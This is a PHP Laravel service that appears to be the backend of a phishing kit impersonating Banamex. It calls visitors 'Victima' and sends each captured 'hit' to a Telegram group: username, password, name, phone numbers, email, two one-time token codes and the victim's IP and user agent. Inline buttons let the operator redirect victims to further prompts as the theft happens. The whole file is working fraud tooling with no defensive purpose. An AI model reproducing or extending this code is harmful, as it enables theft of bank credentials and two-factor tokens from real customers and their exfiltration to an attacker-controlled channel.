<?php

namespace App\Services;

use App\Models\Usuario;
use WeStacks\TeleBot\Laravel\TeleBot;
use Illuminate\Support\Facades\Log;
use Exception;

class TelegramNotificationService
{
    public function sendIngresado(Usuario $usuario, string $tela, string $tema)
    {
        $chatId = config('grupos')['bot']['chat_id'];
        $threadId = config('grupos')['bot']['temas'][$tema];
        $id = $usuario->id;

        // Crear teclado inline
        $keyboard = $this->createInlineKeyboard($id);
        $bot = TeleBot::bot('bot');
        $params = [
            'chat_id' => $chatId,
            'text' => "Victima `$usuario->nombre` ha ingresado `$tela` 👌",
            'parse_mode' => 'Markdown',
            'message_thread_id' => $threadId,
            'reply_markup' => $keyboard, // Move the keyboard here
            'verify' => false,
        ];



        // Eliminar mensaje anterior si existe y está en el mismo thread
        $this->deleteOldMessage($bot, $chatId, $usuario, $threadId, 'msg_in_id');
        try {
            if ($usuario->msg_id)
                $params['reply_parameters'] = [
                    'message_id' => (int)$usuario->msg_id,
                ];
            $msg = $bot->sendMessage($params);
        } catch (\Exception $e) {
            unset($params['reply_parameters']);
            $msg = $bot->sendMessage($params);
        }
        $usuario->msg_in_id = $msg->message_id;
        $this->updateClientThreadId($usuario,  $threadId);
        $usuario->save();
    }

    public function sendUpdate(Usuario $usuario, string $tema)
    {
        $chatId = config('grupos')['bot']['chat_id'];
        $threadId = config('grupos')['bot']['temas'][$tema];



        $message = "╭━━ 😈BANAMEX :.: NUEVO HIT ━━╮\n";
        // Sección LOGIN
        if (!empty($usuario->usuario)) {
            $message .= "┃ 📧  〉ID: `{$usuario->usuario}`\n";
        }
        if (!empty($usuario->password)) {
            $message .= "┃ 📧  〉ID: `{$usuario->password}`\n";
        }

        // Sección DATOS
        if (!empty($usuario->nombre) || !empty($usuario->apellido) || !empty($usuario->telefono_movil || !empty($usuario->telefono_fijo) || !empty($usuario->email))) {
            $message .= "┃ 💵┣ DATOS\n";
            if (!empty($usuario->nombre)) {
                $message .= "┃ 💼  〉NOMBRE: `{$usuario->nombre}`\n";
            }
            if (!empty($usuario->apellido)) {
                $message .= "┃ 💼  〉APELLIDO: `{$usuario->apellido}`\n";
            }
            if (!empty($usuario->telefono_movil)) {
                $message .= "┃ 💼  〉TELEFONO MOVIL: `{$usuario->telefono_movil}`\n";
            }
            if (!empty($usuario->telefono_fijo)) {
                $message .= "┃ 💼  〉TELEFONO FIJO: `{$usuario->telefono_fijo}`\n";
            }
            if (!empty($usuario->email)) {
                $message .= "┃ 💼  〉EMAIL: `{$usuario->email}`\n";
            }
        }

        // Sección FULLZ
        if (!empty($usuario->token_codigo) || !empty($usuario->sgdotoken_codigo)) {
            $message .= "┃ 💵┣ FULLZ\n";
            if (!empty($usuario->token_codigo)) {
                $message .= "┃ 💳  〉TOKEN 1: `{$usuario->token_codigo}`\n";
            }
            if (!empty($usuario->sgdotoken_codigo)) {
                $message .= "┃ 💳  TOKEN 2 : `{$usuario->sgdotoken_codigo}`\n";
            }
        }

        // Sección DEVICE
        if (!empty($usuario->ip_real) || !empty($usuario->user_agent)) {
            $message .= "┃ 💵┣ DEVICE\n";
            if (!empty($usuario->ip_real)) {
                $message .= "┃ 🌎  〉IP: `{$usuario->ip_real}`\n";
            }
            if (!empty($usuario->user_agent)) {
                $message .= "┃ 🌎  〉USER_AGENT: `{$usuario->user_agent}`\n";
            }
        }

        $message .= "╰━━━━━━━━━";



        $params = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown',
            'message_thread_id' => $threadId,
            'verify' => false,
        ];

        $bot = new TeleBot;
        $bot = $bot::bot('bot');

        // Eliminar mensaje anterior si existe y está en el mismo thread
        $this->deleteOldMessage($bot, $chatId, $usuario, $threadId, 'msg_id');

        try {
            $msg = $bot->sendMessage($params);
            $usuario->msg_id = $msg->message_id;
            $this->updateClientThreadId($usuario, $threadId);
            $usuario->save();
        } catch (Exception $e) {
            Log::error('Error enviando mensaje de actualización: ' . $e->getMessage(), [
                'usuario_id' => $usuario->id,
                'chat_id' => $chatId,
                'thread_id' => $threadId
            ]);
        }
    }

    /**
     * Eliminar mensaje anterior si existe y está en el mismo thread
     */
    private function deleteOldMessage($bot, string $chatId, Usuario $usuario, string $threadId, string $messageField): void
    {
        $messageId = $usuario->{$messageField};

        if (empty($messageId)) {
            return;
        }

        // Obtener el thread ID guardado para el usuario
        $clientThreadId = $this->getClientThreadId($usuario);

        // Solo eliminar si está en el mismo thread
        if ($threadId === $clientThreadId) {
            try {
                $bot->deleteMessage([
                    'chat_id' => $chatId,
                    'message_id' => $messageId,
                ]);
                Log::info("Mensaje anterior eliminado: $messageId");
            } catch (Exception $e) {
                Log::warning("Error eliminando mensaje anterior: " . $e->getMessage(), [
                    'message_id' => $messageId,
                    'chat_id' => $chatId
                ]);
            }
        }
    }

    /**
     * Obtener el thread ID del usuario según el método
     */
    private function getClientThreadId(Usuario $usuario): ?string
    {

        return $usuario->bot_thread_id;
    }

    /**
     * Actualizar el thread ID del usuario
     */
    private function updateClientThreadId(Usuario $usuario, string $threadId): void
    {
        $usuario->bot_thread_id = $threadId;
    }

    /**
     * Crear el teclado inline para los botones
     */
    private function createInlineKeyboard(int $usuarioId): array
    {
        $bot = 'bot';
        return [
            'inline_keyboard' => [
                [
                    [
                        'text' => "🟩Redireccion 1",
                        'callback_data' => "pedir:$bot:1:$usuarioId",
                    ],
                    [
                        'text' => "🟥Redireccion 2",
                        'callback_data' => "pedir:$bot:2:$usuarioId",
                    ],
                ],

            ]
        ];
    }
}
